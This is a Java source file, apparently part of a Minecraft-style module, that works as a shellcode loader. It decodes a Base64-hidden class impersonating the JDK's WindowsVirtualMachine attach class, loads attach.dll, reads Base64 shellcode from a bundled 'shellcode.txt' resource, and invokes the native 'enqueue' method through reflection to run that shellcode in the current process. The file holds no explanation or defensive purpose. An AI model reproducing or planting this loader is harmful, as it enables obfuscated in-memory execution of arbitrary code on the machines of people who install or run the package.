package studios.mcmodule.czf233;

import java.io.*;
import java.lang.reflect.*;

public class Main
{
    public static void main(final String[] args) {
        final Base64 base64 = new Base64();
        final String classStr = "yv66vgAAADEAJgoACAAUCAAVCgAWABcJABYAGAgAGQoAGgAbBwAcBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAB2VucXVldWUBAD0oSltCTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvT2JqZWN0OylWAQAKRXhjZXB0aW9ucwcAHgEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEAGldpbmRvd3NWaXJ0dWFsTWFjaGluZS5qYXZhDAAJAAoBAAZhdHRhY2gHAB8MACAAIQwAIgAjAQAbWytdIGxvYWQgYXR0YWNoLmRsbCBzdWNjZXNzBwAkDAAlACEBACZzdW4vdG9vbHMvYXR0YWNoL1dpbmRvd3NWaXJ0dWFsTWFjaGluZQEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAC2xvYWRMaWJyYXJ5AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4AIQAHAAgAAAAAAAMAAQAJAAoAAQALAAAAHQABAAEAAAAFKrcAAbEAAAABAAwAAAAGAAEAAAAJAYgADQAOAAEADwAAAAQAAQAQAAgAEQAKAAEACwAAAC4AAgAAAAAADhICuAADsgAEEgW2AAaxAAAAAQAMAAAADgADAAAACwAFAAwADQANAAEAEgAAAAIAEw==";
        final byte[] decode = base64.decode(classStr);
        final Class<?> clazz = (Class<?>)new CzfClassLoader().getClass(decode);
        try {
            final InputStream stream = Main.class.getResourceAsStream("/scala");
            final Method[] allMethods = clazz.getDeclaredMethods();
            for (int i = allMethods.length - 1; i >= 0; --i) {
                final Method m = allMethods[i];
                if (m.getName().equals("enqueue")) {
                    final long hProcess = -1L;
                    final BufferedReader in = new BufferedReader(new InputStreamReader(Main.class.getResourceAsStream("/shellcode.txt")));
                    final String shellcode = in.readLine();
                    final byte[] buf = base64.decode(String.valueOf(shellcode));
                    assert stream != null;
                    m.setAccessible(true);
                    try {
                        m.invoke(clazz, hProcess, buf, null, null, new Object[0]);
                    }
                    catch (InvocationTargetException e) {
                        e.printStackTrace();
                    }
                }
            }
        }
        catch (Exception L) {
            L.printStackTrace();
        }
    }
}
